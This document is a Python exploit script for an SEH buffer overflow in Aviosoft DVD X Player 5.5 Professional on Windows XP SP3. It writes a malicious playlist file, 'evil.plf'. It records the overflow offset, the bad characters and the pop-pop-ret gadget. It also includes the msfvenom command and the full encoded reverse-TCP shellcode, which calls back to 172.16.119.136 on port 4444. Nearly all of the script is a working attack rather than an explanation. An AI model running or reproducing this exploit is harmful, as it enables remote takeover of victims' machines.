#!/usr/bin/python -w
  
filename="evil.plf"

##############################################################################
# Windows XP Pro SP3 x86
# [+] bad characters = '\x00\x0a\x0d\x1a'
#
# offset to: nseh 608 bytes
# 0x6162b810 : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [EPG.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.12.21.2006 (C:\Program Files\Aviosoft\DVD X Player 5.5 Professional\EPG.dll)
# pop pop ret instruction goes in seh
# buffer = "A"*608 + [nSEH] + [SEH] + "D"*1384
# SEH 
##############################################################################


##############################################################################
#root@kali:~/Desktop/Projects/exploits/DVDXPlayer# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.119.136 LPORT=4444 -b "\x00\x0a\x0d\x1a" -f c
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 11 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351
#Payload size: 351 bytes
#Final size of c file: 1500 bytes
##############################################################################

shellcode = (
"\xba\xd8\xc0\x62\xe1\xda\xd6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x56\x12\x83\xc6\x04\x03\x8e\xce\x80\x14\xd2\x27\xc6"
"\xd7\x2a\xb8\xa7\x5e\xcf\x89\xe7\x05\x84\xba\xd7\x4e\xc8\x36"
"\x93\x03\xf8\xcd\xd1\x8b\x0f\x65\x5f\xea\x3e\x76\xcc\xce\x21"
"\xf4\x0f\x03\x81\xc5\xdf\x56\xc0\x02\x3d\x9a\x90\xdb\x49\x09"
"\x04\x6f\x07\x92\xaf\x23\x89\x92\x4c\xf3\xa8\xb3\xc3\x8f\xf2"
"\x13\xe2\x5c\x8f\x1d\xfc\x81\xaa\xd4\x77\x71\x40\xe7\x51\x4b"
"\xa9\x44\x9c\x63\x58\x94\xd9\x44\x83\xe3\x13\xb7\x3e\xf4\xe0"
"\xc5\xe4\x71\xf2\x6e\x6e\x21\xde\x8f\xa3\xb4\x95\x9c\x08\xb2"
"\xf1\x80\x8f\x17\x8a\xbd\x04\x96\x5c\x34\x5e\xbd\x78\x1c\x04"
"\xdc\xd9\xf8\xeb\xe1\x39\xa3\x54\x44\x32\x4e\x80\xf5\x19\x07"
"\x65\x34\xa1\xd7\xe1\x4f\xd2\xe5\xae\xfb\x7c\x46\x26\x22\x7b"
"\xa9\x1d\x92\x13\x54\x9e\xe3\x3a\x93\xca\xb3\x54\x32\x73\x58"
"\xa4\xbb\xa6\xcf\xf4\x13\x19\xb0\xa4\xd3\xc9\x58\xae\xdb\x36"
"\x78\xd1\x31\x5f\x13\x28\xd2\xcc\xf4\x45\xaa\x65\xf7\xa9\xbb"
"\x29\x7e\x4f\xd1\xc1\xd6\xd8\x4e\x7b\x73\x92\xef\x84\xa9\xdf"
"\x30\x0e\x5e\x20\xfe\xe7\x2b\x32\x97\x07\x66\x68\x3e\x17\x5c"
"\x04\xdc\x8a\x3b\xd4\xab\xb6\x93\x83\xfc\x09\xea\x41\x11\x33"
"\x44\x77\xe8\xa5\xaf\x33\x37\x16\x31\xba\xba\x22\x15\xac\x02"
"\xaa\x11\x98\xda\xfd\xcf\x76\x9d\x57\xbe\x20\x77\x0b\x68\xa4"
"\x0e\x67\xab\xb2\x0e\xa2\x5d\x5a\xbe\x1b\x18\x65\x0f\xcc\xac"
"\x1e\x6d\x6c\x52\xf5\x35\x9c\x19\x57\x1f\x35\xc4\x02\x1d\x58"
"\xf7\xf9\x62\x65\x74\x0b\x1b\x92\x64\x7e\x1e\xde\x22\x93\x52"
"\x4f\xc7\x93\xc1\x70\xc2"
)

evil = "\x90"*20 + shellcode
buffer = "\x41"*608 + "\xeb\x08\x90\x90" + "\x10\xb8\x62\x61" + evil + "\x44"*(2000-608-4-len(evil))
  
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
